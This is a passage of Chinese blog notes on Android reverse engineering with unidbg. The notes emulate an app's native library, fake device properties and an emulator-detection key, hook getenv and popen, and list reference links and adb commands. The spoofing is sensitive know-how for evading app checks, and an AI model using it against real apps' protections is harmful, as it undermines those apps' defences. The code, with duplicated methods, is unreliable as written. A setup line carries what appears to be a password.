<span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................                   </span><br><span class="line">7ff4b68fc8  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br><span class="line">7ff4b68fd8  b8 <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> 5c <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ........\.......</span><br></pre></td></tr></table></figure>

 <img src="/2025/03/08/Notes-Android-II/01.png" class title="This is an example image">

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HookDemoArm64SysCallHandler.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HookDemoArm64SysCallHandler</span> <span class="keyword">extends</span> <span class="title class_">ARM64SyscallHandler</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HookDemoArm64SysCallHandler</span><span class="params">(SvcMemory svcMemory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(svcMemory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">handleUnknownSyscall</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">int</span> NR)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (NR)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">165</span>:</span><br><span class="line">                getrusage(emulator);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.handleUnknownSyscall(emulator, NR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getrusage</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">register</span> <span class="operator">=</span> UnidbgPointer.register(emulator, Arm64Const.UC_ARM64_REG_X1);</span><br><span class="line">        <span class="type">byte</span>[] bytes = hexStringToByteArray(<span class="string">&quot;010000000000000020300500000000000000000000000000e022020000000000149a0100000000000000000000000000000000000000000000000000000000008663000000000000ac190000000000000000000000000000382f000000000000000000000000000000000000000000000000000000000000000000000000000075010000000000009800000000000000&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;bytes.length;i++)&#123;</span><br><span class="line">            register.setByte(i,bytes[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将十六进制字符串转换为字节数组的函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] hexStringToByteArray(String hexString) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> hexString.length();</span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[len / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i += <span class="number">2</span>) &#123;</span><br><span class="line">            data[i / <span class="number">2</span>] = (<span class="type">byte</span>) ((Character.digit(hexString.charAt(i), <span class="number">16</span>) &lt;&lt; <span class="number">4</span>)</span><br><span class="line">                    + Character.digit(hexString.charAt(i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">clock_gettime</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">        <span class="type">RegisterContext</span> <span class="variable">context</span> <span class="operator">=</span> emulator.getContext();</span><br><span class="line">        <span class="type">int</span> <span class="variable">clk_id</span> <span class="operator">=</span> context.getIntArg(<span class="number">0</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">        <span class="type">Pointer</span> <span class="variable">tp</span> <span class="operator">=</span> context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> clk_id == <span class="number">0</span> ? currentTimeMillis() * <span class="number">1000000L</span> : System.nanoTime() - System.nanoTime();</span><br><span class="line">        <span class="type">long</span> <span class="variable">tv_sec</span> <span class="operator">=</span> offset / <span class="number">1000000000L</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">tv_nsec</span> <span class="operator">=</span> offset % <span class="number">1000000000L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (clk_id) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                tp.setLong(<span class="number">0</span>, tv_sec);</span><br><span class="line">                tp.setLong(<span class="number">8</span>, tv_nsec);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.clock_gettime(emulator);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lesson11</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> <span class="keyword">implements</span> <span class="title class_">IOResolver</span> &#123;</span><br><span class="line">    <span class="comment">//定义一个全局可用的模拟器对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> AndroidEmulator androidEmulatorBuilder;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> VM vm;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> DalvikModule dalvikModule;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Memory memory;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个构造函数进行初始化操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">lesson11</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">AndroidEmulatorBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AndroidEmulatorBuilder</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> AndroidEmulator <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AndroidARM64Emulator</span>(processName, rootDir, backendFactories) &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> UnixSyscallHandler&lt;AndroidFileIO&gt; <span class="title function_">createSyscallHandler</span><span class="params">(SvcMemory svcMemory)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">HookDemoArm64SysCallHandler</span>(svcMemory);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化模拟器</span></span><br><span class="line"><span class="comment">//        androidEmulatorBuilder = AndroidEmulatorBuilder</span></span><br><span class="line"><span class="comment">//                .for64Bit()</span></span><br><span class="line"><span class="comment">//                .setProcessName(&quot;com.example.hookdemo&quot;)</span></span><br><span class="line"><span class="comment">//                .addBackendFactory(new Unicorn2Factory(true))</span></span><br><span class="line"><span class="comment">//                .setRootDir(new File(&quot;target/rootfs&quot;))</span></span><br><span class="line"><span class="comment">//                .build();</span></span><br><span class="line"></span><br><span class="line">        androidEmulatorBuilder = builder</span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">Unicorn2Factory</span>(<span class="literal">true</span>))</span><br><span class="line">                .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;target/rootfs&quot;</span>))</span><br><span class="line">                .setProcessName(<span class="string">&quot;com.example.hookdemo&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        vm = androidEmulatorBuilder.createDalvikVM(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/lesson/lesson11/app-debug.apk&quot;</span>));</span><br><span class="line">        vm.setJni(<span class="built_in">this</span>);</span><br><span class="line">        vm.setVerbose(<span class="literal">true</span>);</span><br><span class="line">        androidEmulatorBuilder.getSyscallHandler().addIOResolver(<span class="built_in">this</span>);</span><br><span class="line">        memory = androidEmulatorBuilder.getMemory();</span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">        <span class="comment">// getprop ro.build.id</span></span><br><span class="line">        <span class="type">SystemPropertyHook</span> <span class="variable">systemPropertyHook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SystemPropertyHook</span>(androidEmulatorBuilder);</span><br><span class="line">        systemPropertyHook.setPropertyProvider(<span class="keyword">new</span> <span class="title class_">SystemPropertyProvider</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getProperty</span><span class="params">(String key)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;getProperty systemkey:&quot;</span> + key);</span><br><span class="line">                <span class="keyword">switch</span> (key) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;net.hostname&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;MIX2S-zhongeryayadeM&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.serialno&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;f8a995f5&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.boot.serialno&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;f8a995f5&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.product.brand&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;Xiaomi&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.product.manufacturer&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;Xiaomi&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.product.model&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;MIX 2S&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.product.cpu.abi&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;arm64-v8a&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.product.cpu.abilist&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;arm64-v8a,armeabi-v7a,armeabi&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.boot.vbmeta.digest&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;init.svc.droid4x&quot;</span>: &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;ro.build.id&quot;</span>:&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&quot;PKQ1.190118.001&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        memory.addHookListener(systemPropertyHook);</span><br><span class="line">        dalvikModule = vm.loadLibrary(<span class="string">&quot;hookdemo&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">module</span> = dalvikModule.getModule();</span><br><span class="line">        dalvikModule.callJNI_OnLoad(androidEmulatorBuilder);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">lesson11</span> <span class="variable">lesson11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">lesson11</span>();</span><br><span class="line">        lesson11.setEnv();</span><br><span class="line">        lesson11.hookgetEnv();</span><br><span class="line">        lesson11.xitongdiaoyong();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">xitongdiaoyong</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">DvmClass</span> <span class="variable">dvmClass</span> <span class="operator">=</span> vm.resolveClass(<span class="string">&quot;com.example.hookdemo.MainActivity&quot;</span>);</span><br><span class="line">        DvmObject&lt;?&gt; dvmObject = dvmClass.newObject(<span class="literal">null</span>);</span><br><span class="line">        dvmObject.callJniMethod(androidEmulatorBuilder, <span class="string">&quot;xitongdiaoyong()V&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FileResult <span class="title function_">resolve</span><span class="params">(Emulator emulator, String pathname, <span class="type">int</span> oflags)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;file open:&quot;</span> + pathname);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; getStaticObjectField(BaseVM vm, DvmClass dvmClass, String signature) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;android/os/Build-&gt;MODEL:Ljava/lang/String;&quot;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;MI 6&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getStaticObjectField(vm, dvmClass, signature);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> FileResult <span class="title function_">resolve</span><span class="params">(Emulator emulator, String pathname, <span class="type">int</span> oflags)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;file open:&quot;</span> + pathname);</span><br><span class="line">        <span class="keyword">switch</span> (pathname)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;stat /data&quot;</span>:&#123;</span><br><span class="line">                <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">ByteArrayFileIO</span>(oflags,pathname,(<span class="string">&quot;  File: `/data&#x27;\n&quot;</span> +</span><br><span class="line">                                                                               <span class="string">&quot;  Size: 4096\t Blocks: 16\t IO Blocks: 512\tdirectory\n&quot;</span> +</span><br><span class="line">                                                                               <span class="string">&quot;Device: 10301h/66305d\t Inode: 2\t Links: 46\n&quot;</span> +</span><br><span class="line">                                                                               <span class="string">&quot;Access: (771/drwxrwx--x)\tUid: ( 1000/  system)\tGid: ( 1000/  system)\n&quot;</span> +</span><br><span class="line">                                                                               <span class="string">&quot;Access: 2019-08-22 00:32:54.000000000\n&quot;</span> +</span><br><span class="line">                                                                               <span class="string">&quot;Modify: 2023-05-29 08:37:38.813999995\n&quot;</span> +</span><br><span class="line">                                                                               <span class="string">&quot;Change: 1970-08-12 09:44:20.749999999\n&quot;</span>).getBytes()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; getStaticObjectField(BaseVM vm, DvmClass dvmClass, String signature) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (signature) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;android/os/Build-&gt;MODEL:Ljava/lang/String;&quot;</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;MI 6&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getStaticObjectField(vm, dvmClass, signature);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置环境变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEnv</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Symbol</span> <span class="variable">setenv</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;setenv&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        setenv.call(androidEmulatorBuilder, <span class="string">&quot;muyang&quot;</span>, <span class="string">&quot;6666&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="comment">// hook并修改环境变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hookgetEnv</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Dobby</span> <span class="variable">dobby</span> <span class="operator">=</span> Dobby.getInstance(androidEmulatorBuilder);</span><br><span class="line">        dobby.replace(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;getenv&quot;</span>), <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;</span><br><span class="line">                emulator.set(<span class="string">&quot;envkey&quot;</span>, context.getPointerArg(<span class="number">0</span>).getString(<span class="number">0</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator, context, originFunction);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> emulator.get(<span class="string">&quot;envkey&quot;</span>);</span><br><span class="line">                <span class="keyword">switch</span> (key) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;muyang&quot;</span>:</span><br><span class="line">                        <span class="comment">//修改返回值</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">fakeInput</span> <span class="operator">=</span> <span class="string">&quot;6666&quot;</span>;</span><br><span class="line">                        <span class="comment">//得到长度</span></span><br><span class="line">                        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> fakeInput.length();</span><br><span class="line">                        <span class="comment">//开辟一段内存空间  长度是字符串的长度</span></span><br><span class="line">                        <span class="type">MemoryBlock</span> <span class="variable">fakeInputBlock</span> <span class="operator">=</span> emulator.getMemory().malloc(length, <span class="literal">true</span>);</span><br><span class="line">                        <span class="comment">//往开辟的内存空间中写入byte数据</span></span><br><span class="line">                        fakeInputBlock.getPointer().write(fakeInput.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">                        <span class="comment">//再通过得到寄存器的方式  去写入进去</span></span><br><span class="line">                        emulator.getBackend().reg_write(Arm64Const.UC_ARM64_REG_X0, fakeInputBlock.getPointer().peer);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">super</span>.postCall(emulator, context);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hookPopen</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Dobby</span> <span class="variable">dobby</span> <span class="operator">=</span> Dobby.getInstance(androidEmulatorBuilder);</span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">stat_data_pointer</span> <span class="operator">=</span> UnidbgPointer.pointer(androidEmulatorBuilder, <span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;fopen&quot;</span>).call(androidEmulatorBuilder, <span class="string">&quot;stat /data&quot;</span>, <span class="string">&quot;r&quot;</span>));</span><br><span class="line"></span><br><span class="line">        dobby.replace(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;popen&quot;</span>), <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> originFunction)</span> &#123;</span><br><span class="line">                <span class="type">RegisterContext</span> <span class="variable">registerContext</span> <span class="operator">=</span> emulator.getContext();</span><br><span class="line">                <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> registerContext.getPointerArg(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;command:&quot;</span> + command);</span><br><span class="line"></span><br><span class="line">                emulator.getBackend().reg_write(Arm64Const.UC_ARM64_REG_PC,registerContext.getLRPointer().peer);</span><br><span class="line">                <span class="keyword">switch</span> (command)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&quot;stat /data&quot;</span>:&#123;</span><br><span class="line">                        emulator.getBackend().reg_write(Arm64Const.UC_ARM64_REG_X0,stat_data_pointer.peer);</span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator, originFunction);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator, originFunction);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 <img src="/2025/03/08/Notes-Android-II/02.png" class title="This is an example image">

<p>打开调试模式可查看更详细报错</p>
<h3 id="2、仿写框架"><a href="#2、仿写框架" class="headerlink" title="2、仿写框架"></a>2、仿写框架</h3><p>根据unidbg提供的补其他系统API的例子写</p>
<p>访写 src&#x2F;main&#x2F;java&#x2F;com&#x2F;github&#x2F;unidbg&#x2F;ios&#x2F;ARM64SyscallHandler.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getrusage</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">	<span class="type">RegisterContext</span> <span class="variable">context</span> <span class="operator">=</span> emulator.getContext();</span><br><span class="line">	<span class="type">int</span> <span class="variable">who</span> <span class="operator">=</span> context.getIntArg(<span class="number">0</span>);</span><br><span class="line">	<span class="type">Pointer</span> <span class="variable">r_usage</span> <span class="operator">=</span> context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">	<span class="type">RUsage64</span> <span class="variable">usage64</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RUsage64</span>(r_usage);</span><br><span class="line">	usage64.unpack();</span><br><span class="line">	usage64.fillDefault();</span><br><span class="line">	usage64.pack();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><a href="https://bbs.kanxue.com/thread-272751.html">https://bbs.kanxue.com/thread-272751.html</a></p>
<p><a href="https://buaq.net/go-129256.html">https://buaq.net/go-129256.html</a></p>
<p><a href="https://github.com/gl953236368">https://github.com/gl953236368</a></p>
<p>函数初始化</p>
<p>trace工具</p>
<p>Java层trace工具：<a href="https://github.com/r0ysue/r0tracer">https://github.com/r0ysue/r0tracer</a></p>
<p>Jnitrace：<a href="https://github.com/chame1eon/jnitrace">https://github.com/chame1eon/jnitrace</a></p>
<p>所以unidbg就是用来不运行app的情况下，调用so方法，补环境属于其中的前置环境</p>
<p>dump apk上下文环境</p>
<p>慢慢看吧案例</p>
<p><a href="https://blog.seeflower.dev/search/dump/2/">https://blog.seeflower.dev/search/dump/2/</a></p>
<p>test</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.jianshu.com/p/c546783ad284</span><br><span class="line">https://developer.android.com/ndk/guides/other_build_systems?hl=zh-cn</span><br><span class="line">https://www.cnblogs.com/burner/p/clang-fen-si-bu-bian-yimainc.html   编译博客也不错</span><br><span class="line">https://blog.csdn.net/qq_31865983/article/details/89402100    这个更加完整一点</span><br><span class="line">https://github.com/hugsy/gef</span><br><span class="line">https://www.likecs.com/show-204245381.html#sc=400</span><br><span class="line">Cortex-A7 常用汇编指令资料:</span><br><span class="line">https://www.cnblogs.com/iron2222/p/15640269.html</span><br><span class="line"></span><br><span class="line">gdb调试器快速上手教程</span><br><span class="line">https://blog.csdn.net/qq_45953886/article/details/127678876</span><br><span class="line"></span><br><span class="line">ARM官方汇编指令</span><br><span class="line">https://blog.csdn.net/oqqHuTu12345678/article/details/125683244</span><br><span class="line"></span><br><span class="line">ARM汇编基础 </span><br><span class="line">https://www.cnblogs.com/hilfloser/p/10516610.html</span><br><span class="line"></span><br><span class="line">ARM关于标志位影响详解</span><br><span class="line">https://blog.csdn.net/tabactivity/article/details/90407858</span><br><span class="line"></span><br><span class="line">ARM的九种寻址方式</span><br><span class="line">https://blog.csdn.net/qq_43743762/article/details/105056991</span><br><span class="line"></span><br><span class="line">### 5.编写第一个汇编程序</span><br><span class="line"></span><br><span class="line">&gt; ​	https://www.w3cschool.cn/c/c-file-io.html</span><br><span class="line"></span><br><span class="line">参考资料:https://softool.cn/read/arm_assembly_basic_aye/21010203.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/qq_41028985/article/details/119407917</span><br><span class="line"></span><br><span class="line">### 6.逆向C程序－数据类型</span><br><span class="line"></span><br><span class="line">&gt; 计算器：</span><br><span class="line">&gt; https://www.bangnishouji.com/tools/224457.html</span><br><span class="line"></span><br><span class="line">##### 1.32位浮点数表示方法:</span><br><span class="line"></span><br><span class="line">&gt; 二进制数怎么转化为浮点数？阶码又是怎么算出来的？</span><br><span class="line">&gt; https://zhidao.baidu.com/question/750285508423217012.html</span><br><span class="line"></span><br><span class="line">算法篇:ios和安卓通用</span><br><span class="line"></span><br><span class="line">参考连接:</span><br><span class="line">https://www.cnblogs.com/xiaxveliang/p/15004954.html</span><br><span class="line">https://blog.csdn.net/sinat_27933301/article/details/79538169</span><br><span class="line">https://www.cnblogs.com/DeeLMind/p/7581423.html</span><br><span class="line">https://www.bilibili.com/video/BV1aP411M7ug:强推</span><br><span class="line"></span><br><span class="line">https://www.bilibili.com/video/BV1V14y1T7LM</span><br><span class="line">https://blog.csdn.net/ZCShouCSDN/article/details/84675235</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>灰队</category>
      </categories>
  </entry>
  <entry>
    <title>Notes-Android</title>
    <url>/2024/07/31/Notes-Android/</url>
    <content><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>1、配置 ubutnu 模拟器环境</p>
<p>​	AS+genymotion 配置（396kyzdwPwp6b7A）</p>
<p>​	2、手机&#x2F;模拟器连接</p>
<p>1、USB线连接</p>
<p>2、wifi线，需要桥接，同一个网段，真机需要 root，打开开发者模式和USB调试</p>
<p>手残，在物理机开雷电模拟器，ubuntu的AS连接（要装ARM吗）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在ubuntu上，用AS的adb执行</span><br><span class="line">adb connect 192.168.3.175:5555</span><br><span class="line">adb disconnect ip:5555</span><br><span class="line"></span><br><span class="line">adb -s 设备名称 //多个设备连接</span><br></pre></td></tr></table></figure>

<p>基础语法自己看去教程</p>
<p>四大组件：活动(activity)、意图(Intent)、广播、服务(Service)</p>
<ul>
<li>活动(activity) -&gt; 意图(Intent) -&gt;活动(activity)</li>
<li>服务(Service)：安卓保活</li>
<li>网络通信——HttpURLConnectio_okhttp</li>
<li>JNI<ul>
<li>让 Java 调用 C 语言或者 C++代码，让 C 调用 Java 代码</li>
</ul>
